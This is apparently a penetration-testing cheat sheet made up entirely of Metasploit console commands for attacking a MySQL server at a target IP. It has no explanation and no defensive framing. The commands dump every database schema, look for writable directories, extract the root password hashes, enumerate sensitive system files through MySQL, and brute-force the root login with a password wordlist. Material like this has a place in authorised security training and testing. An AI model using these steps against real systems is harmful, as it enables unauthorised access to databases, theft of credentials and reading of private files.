##### Dump the Schema of all Databases
```
msfconsole
search mysql
use auxiliary/scanner/mysql/mysql_schemadump
set rhosts IP
advanced
set username root
set password ""
run
```

##### Check Writable Directories 
```
use auxiliary/scanner/mysql/mysql_writable_dirs
set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
set rhosts IP
set password ""
set verbose false
run
```

##### System Password Hash for user 'root'
```
use auxiliary/scanner/mysql/mysql_hashdump
set password ""
set rhosts IP
set username root
run
```

##### Find Sensitive Files
```
use auxiliary/scanner/mysql/mysql_file_enum
set rhosts IP
set file_list /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
set password ""
run
```

##### Find the Password
```
use auxiliary/scanner/mysql/mysql_login
set rhosts IP
set username root
set file_list /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set stop_on_success true
set verbose false
run
```